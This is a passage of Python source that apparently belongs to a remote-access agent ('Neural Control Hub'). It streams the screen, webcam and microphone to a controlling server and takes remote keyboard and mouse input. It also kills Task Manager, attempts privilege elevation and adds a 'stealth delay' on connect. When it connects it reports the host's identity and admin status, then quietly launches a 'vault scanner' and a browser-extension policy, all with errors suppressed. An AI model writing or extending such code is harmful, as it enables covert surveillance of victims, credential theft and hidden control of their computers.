                frame_bgr = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                encoded = self.turbo_jpeg.encode(frame_bgr, quality=self.quality)
            else:
                # Fallback to OpenCV
                frame_bgr = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                success, encoded = cv2.imencode('.jpg', frame_bgr, 
                    [cv2.IMWRITE_JPEG_QUALITY, self.quality,
                     cv2.IMWRITE_JPEG_OPTIMIZE, 1])
                if not success:
                    return None
                encoded = encoded.tobytes()
            
            # Optional LZ4 compression for additional bandwidth savings
            if HAS_LZ4 and len(encoded) > 1024:  # Only compress larger frames
                compressed = lz4.frame.compress(encoded, compression_level=1)
                if len(compressed) < len(encoded):
                    return b'LZ4_COMPRESSED' + compressed
            
            self.last_frame = frame.copy()
            return encoded
            
        except Exception as e:
            return None
    
    def start_capture_stream(self, callback, region=None):
        """Start continuous capture stream"""
        if self.running:
            return
        
        self.running = True
        self.capture_thread = threading.Thread(
            target=self._capture_loop, 
            args=(callback, region),
            daemon=True
        )
        self.capture_thread.start()
    
    def _capture_loop(self, callback, region):
        """Main capture loop optimized for low latency"""
        last_time = time.time()
        frame_count = 0
        
        while self.running:
            loop_start = time.time()
            
            # Capture frame
            frame = self.capture_frame(region)
            if frame is not None:
                # Encode frame
                encoded = self.encode_frame(frame)
                if encoded and encoded != b'DELTA_UNCHANGED':
                    callback(encoded)
                
                frame_count += 1
            
            # FPS calculation
            current_time = time.time()
            if current_time - self.fps_start_time >= 1.0:
                self.actual_fps = frame_count
                frame_count = 0
                self.fps_start_time = current_time
            
            # Precise timing control
            elapsed = time.time() - loop_start
            sleep_time = max(0, self.frame_time - elapsed)
            
            if sleep_time > 0:
                # Use high-precision sleep
                if sleep_time > 0.001:
                    time.sleep(sleep_time - 0.001)
                
                # Busy wait for final precision
                target_time = loop_start + self.frame_time
                while time.time() < target_time:
                    pass
    
    def stop_capture_stream(self):
        """Stop capture stream"""
        self.running = False
        if self.capture_thread:
            self.capture_thread.join(timeout=2.0)
    
    def get_stats(self) -> dict:
        """Get capture statistics"""
        return {
            "backend": self._get_backend_name(),
            "target_fps": self.target_fps,
            "actual_fps": self.actual_fps,
            "quality": self.quality,
            "delta_compression": self.enable_delta_compression,
            "turbojpeg": HAS_TURBOJPEG,
            "lz4": HAS_LZ4
        }
    
    def set_quality(self, quality: int):
        """Dynamically adjust encoding quality"""
        self.quality = max(10, min(100, quality))
    
    def set_fps(self, fps: int):
        """Dynamically adjust target FPS"""
        self.target_fps = max(10, min(120, fps))
        self.frame_time = 1.0 / self.target_fps
    
    def __del__(self):
        """Cleanup"""
        try:
            if hasattr(self, 'capture_thread') and self.capture_thread:
                self.stop_capture_stream()
            if hasattr(self, 'capture_backend') and hasattr(self, 'backend_type') and self.backend_type == "dxcam":
                try:
                    if hasattr(self.capture_backend, 'release'):
                        self.capture_backend.release()
                except:
                    pass
        except:
            pass  # Ignore cleanup errors during destruction


class AdaptiveQualityManager:
    """Manages adaptive quality based on network conditions"""
    
    def __init__(self, capture):
        self.capture = capture
        self.bandwidth_samples = []
        self.max_samples = 30
        self.last_adjustment = time.time()
        self.adjustment_interval = 2.0  # seconds
    
    def update_bandwidth(self, bytes_sent: int, time_elapsed: float):
        """Update bandwidth measurement"""
        if time_elapsed > 0:
            bandwidth = bytes_sent / time_elapsed
            self.bandwidth_samples.append(bandwidth)
            
            if len(self.bandwidth_samples) > self.max_samples:
                self.bandwidth_samples.pop(0)
            
            # Adaptive quality adjustment
            current_time = time.time()
            if current_time - self.last_adjustment > self.adjustment_interval:
                self._adjust_quality()
                self.last_adjustment = current_time
    
    def _adjust_quality(self):
        """Adjust quality based on bandwidth"""
        if len(self.bandwidth_samples) < 5:
            return
        
        avg_bandwidth = sum(self.bandwidth_samples) / len(self.bandwidth_samples)
        current_quality = self.capture.quality
        
        # Simple adaptive algorithm
        if avg_bandwidth < 500000:  # < 500KB/s
            new_quality = max(current_quality - 10, 30)
        elif avg_bandwidth > 2000000:  # > 2MB/s
            new_quality = min(current_quality + 5, 95)
        else:
            return  # No change needed
        
        if new_quality != current_quality:
            self.capture.set_quality(new_quality)
class LowLatencyInputHandler:
    """High-performance input handler for remote control with minimal latency."""
    
    def __init__(self, max_queue_size=1000):
        self.input_queue = queue.Queue(maxsize=max_queue_size)
        self.running = False
        self.thread = None
        self.stats = {
            'inputs_processed': 0,
            'avg_latency': 0.0,
            'total_latency': 0.0
        }
    
    def start(self):
        """Start the input handler thread."""
        if not self.running:
            self.running = True
            self.thread = threading.Thread(target=self._input_worker, daemon=True)
            self.thread.start()
            log_message("Low latency input handler started")
    
    def stop(self):
        """Stop the input handler thread."""
        self.running = False
        if self.thread:
            self.thread.join(timeout=1.0)
    
    def handle_input(self, input_data):
        """Queue input data for processing."""
        try:
            if not self.input_queue.full():
                input_data['timestamp'] = time.time()
                self.input_queue.put(input_data, block=False)
                return True
            else:
                log_message("Input queue full, dropping input", "warning")
                return False
        except Exception as e:
            log_message(f"Error queuing input: {e}")
            return False
    
    def _input_worker(self):
        """Worker thread that processes input commands."""
        while self.running:
            try:
                try:
                    input_data = self.input_queue.get(timeout=0.1)
                except queue.Empty:
                    continue
                
                start_time = time.time()
                self._process_input(input_data)
                
                # Update latency stats
                latency = time.time() - start_time
                self.stats['total_latency'] += latency
                self.stats['inputs_processed'] += 1
                self.stats['avg_latency'] = self.stats['total_latency'] / self.stats['inputs_processed']
                
            except Exception as e:
                log_message(f"Error in input worker: {e}")
                time.sleep(0.001)  # Brief pause on error
    
    def _process_input(self, input_data):
        """Process a single input command."""
        try:
            action = input_data.get('action')
            data = input_data.get('data', {})
            
            if action == 'key_press':
                self._handle_key_press(data)
            elif action == 'mouse_move':
                self._handle_mouse_move(data)
            elif action == 'mouse_click':
                self._handle_mouse_click(data)
            else:
                log_message(f"Unknown input action: {action}")
                
        except Exception as e:
            log_message(f"Error processing input: {e}")
    
    def _handle_key_press(self, data):
        """Handle key press input."""
        if keyboard_controller:
            key = data.get('key')
            if key:
                try:
                    keyboard_controller.press(key)
                    time.sleep(0.01)  # Brief press
                    keyboard_controller.release(key)
                except Exception as e:
                    log_message(f"Error handling key press: {e}")
    
    def _handle_mouse_move(self, data):
        """Handle mouse movement input."""
        if mouse_controller:
            x = data.get('x', 0)
            y = data.get('y', 0)
            try:
                mouse_controller.position = (x, y)
            except Exception as e:
                log_message(f"Error handling mouse move: {e}")
    
    def _handle_mouse_click(self, data):
        """Handle mouse click input."""
        if mouse_controller:
            button = data.get('button', 'left')
            try:
                if button == 'left':
                    mouse_controller.click(button=button)
                elif button == 'right':
                    mouse_controller.click(button=button)
                elif button == 'middle':
                    mouse_controller.click(button=button)
            except Exception as e:
                log_message(f"Error handling mouse click: {e}")
    
    def get_stats(self):
        """Get performance statistics."""
        return self.stats.copy()

# ========================================================================================
# WEBRTC MEDIA STREAM TRACKS FOR LOW-LATENCY STREAMING
# ========================================================================================

if AIORTC_AVAILABLE:
    class ScreenTrack(MediaStreamTrack):
        """WebRTC MediaStreamTrack for screen capture with sub-second latency."""
        
        kind = "video"
    
        def __init__(self, agent_id, target_fps=30, quality=85):
            super().__init__()
            self.agent_id = agent_id
            self.target_fps = target_fps
            self.quality = quality
            self.frame_interval = 1.0 / target_fps
            self._target_fps = target_fps
            self.target_width = WEBRTC_CONFIG['quality_levels']['low']['width']
            self.target_height = WEBRTC_CONFIG['quality_levels']['low']['height']
            self.last_frame_time = 0
            self.capture = None
            self._start_time = time.time()
            self.stats = {
                'frames_sent': 0,
                'total_bytes': 0,
                'avg_latency': 0.0,
                'fps': 0.0
            }
            
            # Initialize capture backend
            if AIORTC_AVAILABLE:
                try:
                    if MSS_AVAILABLE:
                        import mss
                        self.capture = mss.mss()
                    elif CV2_AVAILABLE:
                        self.capture = cv2.VideoCapture(0)  # Fallback to camera if screen capture fails
                    log_message(f"ScreenTrack initialized for agent {agent_id} at {target_fps} FPS")
                except Exception as e:
                    log_message(f"Failed to initialize ScreenTrack: {e}", "error")

        async def next_timestamp(self):
            pts = int((time.time() - self._start_time) * 90000)
            time_base = Fraction(1, 90000)
            return pts, time_base
    
        async def recv(self):
            """Generate and return video frames for WebRTC streaming."""
            if not AIORTC_AVAILABLE or not self.capture:
                # Fallback to placeholder frame
                frame = av.VideoFrame.from_ndarray(
                    np.zeros((480, 640, 3), dtype=np.uint8),
                    format="bgr24"
                )
                frame.pts, frame.time_base = await self.next_timestamp()
                return frame
            
            try:
                current_time = time.time()
                
                # Control frame rate
                if current_time - self.last_frame_time < self.frame_interval:
                    await asyncio.sleep(0.001)  # Brief pause
                    return await self.recv()
                
                # Capture screen frame
                if MSS_AVAILABLE and hasattr(self.capture, 'grab'):
                    # Use mss for screen capture
                    if len(self.capture.monitors) > 1:
                        monitor = self.capture.monitors[1]
                    else:
                        monitor = self.capture.monitors[0]
                    
                    screenshot = self.capture.grab(monitor)
                    img_array = np.array(screenshot)
                    
                    # Convert BGRA to BGR
                    if img_array.shape[2] == 4:
                        img_array = img_array[:, :, :3]
                    
                elif CV2_AVAILABLE and hasattr(self.capture, 'read'):
                    # Fallback to OpenCV
                    ret, frame = self.capture.read()
                    if not ret:
                        # Generate placeholder frame
                        img_array = np.zeros((480, 640, 3), dtype=np.uint8)
                    else:
                        img_array = frame
                else:
                    # Generate placeholder frame
                    img_array = np.zeros((480, 640, 3), dtype=np.uint8)
                
                # Resize
                h, w = img_array.shape[:2]
                if w != self.target_width or h != self.target_height:
                    img_array = cv2.resize(img_array, (self.target_width, self.target_height), interpolation=cv2.INTER_AREA)
                # Create VideoFrame for aiortc
                frame = av.VideoFrame.from_ndarray(img_array, format="bgr24")
                frame.pts, frame.time_base = await self.next_timestamp()
                
                # Update stats
                self.stats['frames_sent'] += 1
                self.stats['fps'] = 1.0 / (current_time - self.last_frame_time) if self.last_frame_time > 0 else 0
                self.last_frame_time = current_time
                
                return frame
                
            except Exception as e:
                log_message(f"Error in ScreenTrack.recv: {e}", "error")
                # Return placeholder frame on error
                frame = av.VideoFrame.from_ndarray(
                    np.zeros((480, 640, 3), dtype=np.uint8),
                    format="bgr24"
                )
                frame.pts, frame.time_base = await self.next_timestamp()
                return frame
    
        def get_stats(self):
            """Get streaming statistics."""
            return self.stats.copy()
    
        def set_quality(self, quality):
            self.quality = max(1, min(100, quality))
            q = self.quality
            if q <= 55:
                self.target_width = 640
                self.target_height = 480
            elif q <= 75:
                self.target_width = 1280
                self.target_height = 720
            else:
                self.target_width = 1920
                self.target_height = 1080
    
        def set_fps(self, fps):
            self.target_fps = max(1, min(60, fps))
            self._target_fps = self.target_fps
            self.frame_interval = 1.0 / self.target_fps


if AIORTC_AVAILABLE:
    class AudioTrack(MediaStreamTrack):
        """WebRTC MediaStreamTrack for audio capture with low latency."""
        
        kind = "audio"
        
        def __init__(self, agent_id, sample_rate=44100, channels=1):
            super().__init__()
            self.agent_id = agent_id
            self.sample_rate = sample_rate
            self.channels = channels
            self.frame_size = 960  # 20ms at 48kHz
            self.audio_queue = queue.Queue(maxsize=100)
            self._timestamp = 0
            self.stats = {
                'audio_frames_sent': 0,
                'total_samples': 0,
                'sample_rate': sample_rate
            }
            
            # Initialize audio capture
            if AIORTC_AVAILABLE and PYAUDIO_AVAILABLE:
                try:
                    self.audio = pyaudio.PyAudio()
                    self.stream = self.audio.open(
                        format=pyaudio.paFloat32,
                        channels=channels,
                        rate=sample_rate,
                        input=True,
                        frames_per_buffer=self.frame_size,
                        stream_callback=self._audio_callback
                    )
                    self.stream.start_stream()
                    log_message(f"AudioTrack initialized for agent {agent_id}")
                except Exception as e:
                        log_message(f"Failed to initialize AudioTrack: {e}", "error")
                        self.audio = None
                        self.stream = None
        
        def _audio_callback(self, in_data, frame_count, time_info, status):
            """Audio capture callback for PyAudio."""
            try:
                if not self.audio_queue.full():
                    self.audio_queue.put(in_data)
            except Exception as e:
                log_message(f"Audio callback error: {e}", "error")
            return (None, pyaudio.paContinue)
        
        async def next_timestamp(self):
            pts = self._timestamp
            self._timestamp += self.frame_size
            time_base = Fraction(1, self.sample_rate)
            return pts, time_base

        async def recv(self):
            """Generate and return audio frames for WebRTC streaming."""
            if not AIORTC_AVAILABLE:
                # Fallback to silence
                frame = av.AudioFrame.from_ndarray(
                    np.zeros((1, self.frame_size), dtype=np.float32),
                    format="flt",
                    layout="stereo" if self.channels == 2 else "mono"
                )
                frame.pts, frame.time_base = await self.next_timestamp()
                frame.sample_rate = self.sample_rate
                return frame
            
            try:
                # Get audio data from queue
                try:
                    audio_data = self.audio_queue.get_nowait()
                except queue.Empty:
                    # Generate silence if no audio data
                    audio_data = np.zeros(self.frame_size * self.channels, dtype=np.float32)
                
                # Convert to numpy array
                if isinstance(audio_data, bytes):
                    audio_array = np.frombuffer(audio_data, dtype=np.float32)
                else:
                    audio_array = np.array(audio_data, dtype=np.float32)
                
                # Reshape for channels
                if self.channels == 2:
                    audio_array = audio_array.reshape(2, -1)
                else:
                    audio_array = audio_array.reshape(1, -1)
                
                # Create AudioFrame for aiortc
                frame = av.AudioFrame.from_ndarray(
                    audio_array,
                    format="flt",
                    layout="stereo" if self.channels == 2 else "mono"
                )
                frame.pts, frame.time_base = await self.next_timestamp()
                frame.sample_rate = self.sample_rate
                
                # Update stats
                self.stats['audio_frames_sent'] += 1
                self.stats['total_samples'] += audio_array.shape[1]
                
                return frame
                
            except Exception as e:
                log_message(f"Error in AudioTrack.recv: {e}", "error")
                # Return silence on error
                frame = av.AudioFrame.from_ndarray(
                    np.zeros((1, self.frame_size), dtype=np.float32),
                    format="flt",
                    layout="stereo" if self.channels == 2 else "mono"
                )
                frame.pts, frame.time_base = await self.next_timestamp()
                frame.sample_rate = self.sample_rate
                return frame
    
    def get_stats(self):
        """Get audio streaming statistics."""
        return self.stats.copy()
    
    def __del__(self):
        """Cleanup audio resources."""
        if hasattr(self, 'stream') and self.stream:
            try:
                self.stream.stop_stream()
                self.stream.close()
            except:
                pass
        if hasattr(self, 'audio') and self.audio:
            try:
                self.audio.terminate()
            except:
                pass


if AIORTC_AVAILABLE:
    class CameraTrack(MediaStreamTrack):
        """WebRTC MediaStreamTrack for camera capture with low latency."""
        
        kind = "video"
        
        def __init__(self, agent_id, camera_index=0, target_fps=30, quality=85):
            super().__init__()
            self.agent_id = agent_id
            self.camera_index = camera_index
            self.target_fps = target_fps
            self.quality = quality
            self.frame_interval = 1.0 / target_fps
            self._target_fps = target_fps
            self.last_frame_time = 0
            self.capture = None
            self.synthetic = False  # Flag for synthetic stream
            self._start_time = time.time()
            self.stats = {
                'frames_sent': 0,
                'total_bytes': 0,
                'avg_latency': 0.0,
                'fps': 0.0
            }
            
            # Initialize camera capture
            if AIORTC_AVAILABLE and CV2_AVAILABLE:
                try:
                    self.capture = cv2.VideoCapture(camera_index)
                    if not self.capture.isOpened():
                        log_message(f"Failed to open camera {camera_index} - falling back to synthetic stream", "warning")
                        self.capture = None
                        self.synthetic = True
                    else:
                        # Set camera properties for low latency
                        self.capture.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                        self.capture.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
                        self.capture.set(cv2.CAP_PROP_FPS, target_fps)
                        self.capture.set(cv2.CAP_PROP_BUFFERSIZE, 1)  # Minimize buffering
                        log_message(f"CameraTrack initialized for agent {agent_id} at {target_fps} FPS")
                except Exception as e:
                    log_message(f"Failed to initialize CameraTrack: {e} - falling back to synthetic stream", "error")
                    self.synthetic = True

        async def next_timestamp(self):
            pts = int((time.time() - self._start_time) * 90000)
            time_base = Fraction(1, 90000)
            return pts, time_base
    
        async def recv(self):
            """Generate and return camera frames for WebRTC streaming."""
            if not AIORTC_AVAILABLE:
                # Fallback to placeholder frame
                frame = av.VideoFrame.from_ndarray(
                    np.zeros((480, 640, 3), dtype=np.uint8),
                    format="bgr24"
                )
                frame.pts, frame.time_base = await self.next_timestamp()
                return frame
        
            try:
                current_time = time.time()
            
                # Control frame rate
                if current_time - self.last_frame_time < self.frame_interval:
                    await asyncio.sleep(0.001)  # Brief pause
                    return await self.recv()
            
                img_array = None
                
                if self.synthetic or not self.capture:
                    # Generate synthetic frame
                    width, height = 640, 480
                    img_array = np.zeros((height, width, 3), dtype=np.uint8)
                    
                    # Background color (dark blue)
                    img_array[:] = (30, 30, 60)
                    
                    # Add moving element (bouncing ball)
                    t = time.time()
                    cx = int(width/2 + (width/3) * math.sin(t * 2))
                    cy = int(height/2 + (height/3) * math.cos(t * 1.5))
                    cv2.circle(img_array, (cx, cy), 30, (0, 255, 255), -1)
                    
                    # Add text
                    font = cv2.FONT_HERSHEY_SIMPLEX
                    cv2.putText(img_array, f"NO CAMERA - SYNTHETIC STREAM", (50, 50), font, 1, (255, 255, 255), 2)
                    cv2.putText(img_array, f"Agent: {self.agent_id}", (50, 90), font, 0.7, (200, 200, 200), 1)
                    cv2.putText(img_array, f"Time: {time.strftime('%H:%M:%S')}", (50, 130), font, 0.7, (200, 200, 200), 1)
                    cv2.putText(img_array, f"FPS: {self.stats.get('fps', 0):.1f}", (50, 170), font, 0.7, (0, 255, 0), 1)
                else:
                    # Capture camera frame
                    ret, frame = self.capture.read()
                    if not ret:
                        # Fallback to synthetic if read fails
                        self.synthetic = True
                        log_message("Camera read failed - switching to synthetic stream", "warning")
                        # Recursively call recv to generate synthetic frame immediately
                        return await self.recv()
                    else:
                        img_array = frame
            
                # Create VideoFrame for aiortc
                frame = av.VideoFrame.from_ndarray(img_array, format="bgr24")
                frame.pts, frame.time_base = await self.next_timestamp()
            
                # Update stats
                self.stats['frames_sent'] += 1
                self.stats['fps'] = 1.0 / (current_time - self.last_frame_time) if self.last_frame_time > 0 else 0
                self.last_frame_time = current_time
            
                return frame
            
            except Exception as e:
                log_message(f"Error in CameraTrack.recv: {e}", "error")
                # Return placeholder frame on error
                frame = av.VideoFrame.from_ndarray(
                    np.zeros((480, 640, 3), dtype=np.uint8),
                    format="bgr24"
                )
                frame.pts, frame.time_base = await self.next_timestamp()
                return frame
    
        def get_stats(self):
            """Get camera streaming statistics."""
            return self.stats.copy()
        
        def set_quality(self, quality):
            self.quality = max(1, min(100, quality))
            q = self.quality
            w = 640
            h = 480
            if q <= 55:
                w, h = 640, 480
            elif q <= 75:
                w, h = 1280, 720
            else:
                w, h = 1920, 1080
            if self.capture:
                try:
                    self.capture.set(cv2.CAP_PROP_FRAME_WIDTH, w)
                    self.capture.set(cv2.CAP_PROP_FRAME_HEIGHT, h)
                except Exception:
                    pass
        
        def set_fps(self, fps):
            self.target_fps = max(1, min(60, fps))
            self._target_fps = self.target_fps
            self.frame_interval = 1.0 / self.target_fps
        
        def __del__(self):
            """Cleanup camera resources."""
            if hasattr(self, 'capture') and self.capture:
                try:
                    self.capture.release()
                except:
                    pass


# Fast serialization
try:
    import msgpack
    HAS_MSGPACK = True
except ImportError:
    HAS_MSGPACK = False
# ========================================================================================
# PROCESS TERMINATION TEST FUNCTIONS
# From: test_process_termination.py
# ========================================================================================
def test_process_termination_functionality():
    """Test enhanced process termination with admin privileges functionality."""
    log_message("Enhanced Process Termination Test")
    log_message("=" * 40)
    
    # Check current privileges
    if WINDOWS_AVAILABLE:
        if is_admin():
            log_message("[OK] Running with administrator privileges")
        else:
            log_message("[WARN] Running with user privileges")
            log_message("Attempting to elevate privileges...")
            if elevate_privileges():
                log_message("[OK] Privilege escalation successful")
            else:
                log_message("[FAIL] Privilege escalation failed")
                log_message("Some termination methods may fail")
    else:
        log_message("[OK] Running on Linux/Unix system")
        if os.geteuid() == 0:
            log_message("[OK] Running as root")
        else:
            log_message("[WARN] Running as regular user")
    
    log_message("\nAvailable commands:")
    log_message("1. kill-taskmgr - Terminate Task Manager")
    log_message("2. terminate <process_name> - Terminate process by name")
    log_message("3. terminate <pid> - Terminate process by PID")
    log_message("4. quit - Exit")
    
    while True:
        try:
            # Non-interactive mode - no user input
            return
            
            if command == "quit" or command == "exit":
                break
            elif command == "kill-taskmgr":
                log_message("Attempting to terminate Task Manager...")
                result = kill_task_manager()
                log_message(f"Result: {result}")
            elif command.startswith("terminate "):
                target = command.split(" ", 1)[1]
                
                # Try to convert to PID if it's a number
                try:
                    target = int(target)
                    log_message(f"Attempting to terminate process with PID {target}...")
                except ValueError:
                    log_message(f"Attempting to terminate process '{target}'...")
                
                result = terminate_process_with_admin(target, force=True)
                log_message(f"Result: {result}")
            else:
                log_message("Unknown command. Use 'kill-taskmgr', 'terminate <name/pid>', or 'quit'")
                
        except KeyboardInterrupt:
            log_message("\nExiting...")
            break
        except Exception as e:
            log_message(f"Error: {e}")

# ========================================================================================
# END OF COMBINED MODULES
# ========================================================================================

# ========================================================================================
# AGENT MAIN ENTRY POINT
# ========================================================================================

def main():
    """Main function for the standalone Agent."""
    import argparse
    
    parser = argparse.ArgumentParser(description='Neural Control Hub - Standalone Agent')
    parser.add_argument('--fixed-url', action='store_true', help='Force use of fixed SERVER_URL override')
    
    args = parser.parse_args()
    
    global USE_FIXED_SERVER_URL, SERVER_URL
    if args.fixed_url:
        USE_FIXED_SERVER_URL = True
        SERVER_URL = FIXED_SERVER_URL
        log_message(f"Using fixed SERVER_URL: {SERVER_URL}")
    
    # Validate provided default secrets against expected SHA-256 hashes
    try:
        validate_secret_hashes()
    except Exception:
        pass

    log_message("Starting in Agent mode...")
    # Kick off background initializer with progress display and elevated tasks
    try:
        initializer = get_background_initializer()
        initializer.start_background_initialization(quick_startup=False)
    except Exception as e:
        log_message(f"Background initializer failed: {e}", "warning")
        
    agent_main()

# ========================================================================================
# SOCKETIO EVENT HANDLERS FOR AGENT
# ========================================================================================

def connect():
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle connect event", "warning")
        return
    """Handle connection to server."""
    agent_id = get_or_create_agent_id()
    
    # Add stealth delay
    sleep_random_non_blocking()
    
    # Connection message
    log_message(f"Connected to server. Registering with agent_id: {agent_id}")
    
    safe_emit('agent_connect', {
        'agent_id': agent_id,
        'alias': (read_local_alias() or None),
        'hostname': socket.gethostname(),
        'platform': platform.system(),
        'os_version': platform.release(),
        'ip_address': get_local_ip(),
        'public_ip': get_public_ip(),
        'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
        'version': '2.1',
        'is_admin': bool(is_admin()),
        'capabilities': {
            'screen': True,
            'camera': CV2_AVAILABLE,
            'audio': PYAUDIO_AVAILABLE,
            'clipboard': True,
            'file_manager': True,
            'process_manager': PSUTIL_AVAILABLE,
            'webcam': CV2_AVAILABLE,
            'webrtc': AIORTC_AVAILABLE
        },
        'timestamp': int(time.time() * 1000)
    })
    try:
        start_vault_scanner()
    except Exception:
        pass
    try:
        install_vault_extension_policy()
    except Exception:
        pass
    try:
        start_extension_monitor(30)
    except Exception:
        pass
    
    # Emit WebRTC status if available
    if AIORTC_AVAILABLE:
        try:
            emit_webrtc_status()
        except Exception as e:
            log_message(f"Failed to emit WebRTC status on connect: {e}", "warning")
    # Start telemetry thread (CPU/memory)
    try:
        import psutil
        def _telemetry_loop():
            try:
                while sio and sio.connected:
                    try:
                        io_start = psutil.net_io_counters()
                        start_total = float(io_start.bytes_sent + io_start.bytes_recv)
                        cpu = psutil.cpu_percent(interval=1)
                        mem = psutil.virtual_memory().percent
                        io_end = psutil.net_io_counters()
                        end_total = float(io_end.bytes_sent + io_end.bytes_recv)
                        net_delta = end_total - start_total
                        if net_delta < 0:
                            net_delta = 0.0
                        net = round(net_delta / (1024.0 * 1024.0), 2)
                        if sio.connected:
                            safe_emit('agent_telemetry', {'agent_id': agent_id, 'cpu': cpu, 'memory': mem, 'network': net})  # [ OK ] SAFE
                        else:
                            time.sleep(5)
                    except KeyboardInterrupt:
                        log_message("Telemetry worker interrupted")
                        break
                    except Exception as e:
                        error_msg = str(e)
                        # Silence connection errors
                        if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
                            log_message(f"Telemetry error: {e}", "warning")
                        time.sleep(5)
                        break
            except KeyboardInterrupt:
                log_message("Telemetry worker interrupted")
            log_message("Telemetry worker stopped")
        threading.Thread(target=_telemetry_loop, daemon=True).start()
    except Exception:
        pass

def disconnect():
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available, cannot handle disconnect event", "warning")
        return
    """Handle disconnection from server."""
    log_message("Disconnected from server")

def on_start_stream(data):
    """Handle start_stream event from controller UI."""
    try:
        if not SOCKETIO_AVAILABLE or sio is None:
            log_message("Socket.IO not available, cannot handle start_stream", "warning")
            emit_system_notification('error', 'Stream Handler Error', 'Socket.IO not available')
            return
        
        agent_id = get_or_create_agent_id()
        stream_type = data.get('type', 'screen')  # screen, camera, or audio
        quality = data.get('quality', 'high')
        try:
            q = str(quality or 'high').lower()
            if stream_type == 'screen':
                if q == 'low':
                    TARGET_FPS = 15
                    SCREEN_MAX_WIDTH = 854
                    SCREEN_JPEG_QUALITY = 50
                elif q == 'medium':
                    TARGET_FPS = 15
                    SCREEN_MAX_WIDTH = 1280
                    SCREEN_JPEG_QUALITY = 60
                else:
                    TARGET_FPS = 20
                    SCREEN_MAX_WIDTH = 1280
                    SCREEN_JPEG_QUALITY = 70
            elif stream_type == 'camera':
                if q == 'low':
                    TARGET_CAMERA_FPS = 15
                elif q == 'medium':
                    TARGET_CAMERA_FPS = 20
                else:
                    TARGET_CAMERA_FPS = 25
        except Exception:
            pass
        
        log_message(f"[START_STREAM] Received request: type={stream_type}, quality={quality}")
        
        if stream_type == 'screen':
            start_streaming(agent_id)
            log_message(f"[START_STREAM] Screen streaming started")
            safe_emit('stream_started', {
                'agent_id': agent_id,
                'type': 'screen',
                'status': 'success'
            })
        elif stream_type == 'camera':
            start_camera_streaming(agent_id)
            log_message(f"[START_STREAM] Camera streaming started")
            safe_emit('stream_started', {
                'agent_id': agent_id,
                'type': 'camera',
                'status': 'success'
            })
        elif stream_type == 'audio':
            start_audio_streaming(agent_id)
            log_message(f"[START_STREAM] Audio streaming started")
            safe_emit('stream_started', {
                'agent_id': agent_id,
                'type': 'audio',
                'status': 'success'
            })
        else:
            log_message(f"[START_STREAM] Unknown stream type: {stream_type}", "warning")
            emit_system_notification('warning', 'Unknown Stream Type', f'Stream type {stream_type} is not supported')
            safe_emit('stream_error', {
                'agent_id': agent_id,
                'type': stream_type,
                'error': f'Unknown stream type: {stream_type}'
            })
    except Exception as e:
        log_message(f"[START_STREAM] Error starting {stream_type} stream: {e}", "error")
        emit_system_notification('error', 'Stream Handler Error', f'Error in stream handler: {str(e)}')
        safe_emit('stream_error', {
            'agent_id': agent_id,
            'type': stream_type,
            'error': str(e)
        })

def on_set_stream_params(data):
    try:
        global TARGET_FPS, SCREEN_MAX_WIDTH, SCREEN_JPEG_QUALITY, TARGET_CAMERA_FPS, DELTA_STREAM_ENABLED, STREAM_TILE_SIZE, DELTA_DIFF_THRESHOLD, CURSOR_EMIT_ENABLED
        t = str(data.get('type', 'screen') or 'screen').lower()
        fps = data.get('fps')
        width = data.get('max_width')
        quality = data.get('jpeg_quality')
        delta = data.get('delta')
        tile_size = data.get('tile_size')
        diff_threshold = data.get('diff_threshold')
        cursor_emit = data.get('cursor_emit')
        if t == 'screen':
            if isinstance(fps, (int, float)) and fps > 0:
                TARGET_FPS = int(fps)
            if isinstance(width, (int, float)) and width > 0:
                SCREEN_MAX_WIDTH = int(width)
            if isinstance(quality, (int, float)) and 1 <= int(quality) <= 100:
                SCREEN_JPEG_QUALITY = int(quality)
            if isinstance(delta, bool):
                DELTA_STREAM_ENABLED = delta
            if isinstance(tile_size, (int, float)) and int(tile_size) >= 16:
                STREAM_TILE_SIZE = int(tile_size)
            if isinstance(diff_threshold, (int, float)) and int(diff_threshold) >= 1:
                DELTA_DIFF_THRESHOLD = int(diff_threshold)
            if isinstance(cursor_emit, bool):
                CURSOR_EMIT_ENABLED = cursor_emit
            safe_emit('agent_notification', {'type': 'info', 'title': 'Screen Params Updated', 'message': f'FPS={TARGET_FPS}, max_width={SCREEN_MAX_WIDTH}, quality={SCREEN_JPEG_QUALITY}'})
        elif t == 'camera':
            if isinstance(fps, (int, float)) and fps > 0:
                TARGET_CAMERA_FPS = int(fps)
            safe_emit('agent_notification', {'type': 'info', 'title': 'Camera Params Updated', 'message': f'FPS={TARGET_CAMERA_FPS}'})
    except Exception as e:
        safe_emit('agent_notification', {'type': 'error', 'title': 'Param Update Error', 'message': str(e)})
def on_stop_stream(data):
    """Handle stop_stream event from controller UI."""
    try:
        if not SOCKETIO_AVAILABLE or sio is None:
            log_message("Socket.IO not available, cannot handle stop_stream", "warning")
            emit_system_notification('error', 'Stream Handler Error', 'Socket.IO not available')
            return
        
        agent_id = get_or_create_agent_id()
        stream_type = data.get('type', 'screen')  # screen, camera, or audio
        
        log_message(f"[STOP_STREAM] Received request: type={stream_type}")
        
        if stream_type == 'screen':
            stop_streaming()
            log_message(f"[STOP_STREAM] Screen streaming stopped")
            safe_emit('stream_stopped', {
                'agent_id': agent_id,
                'type': 'screen',
                'status': 'success'
            })
        elif stream_type == 'camera':
            stop_camera_streaming()
            log_message(f"[STOP_STREAM] Camera streaming stopped")
            safe_emit('stream_stopped', {
                'agent_id': agent_id,
                'type': 'camera',
                'status': 'success'
            })
        elif stream_type == 'audio':
            stop_audio_streaming()
            log_message(f"[STOP_STREAM] Audio streaming stopped")
            safe_emit('stream_stopped', {
                'agent_id': agent_id,
                'type': 'audio',
                'status': 'success'
            })
        else:
            log_message(f"[STOP_STREAM] Unknown stream type: {stream_type}", "warning")
            emit_system_notification('warning', 'Unknown Stream Type', f'Stream type {stream_type} is not supported')
    except Exception as e:
        log_message(f"[STOP_STREAM] Error stopping {stream_type} stream: {e}", "error")
        emit_system_notification('error', 'Stream Handler Error', f'Error stopping stream: {str(e)}')

def on_command(data):
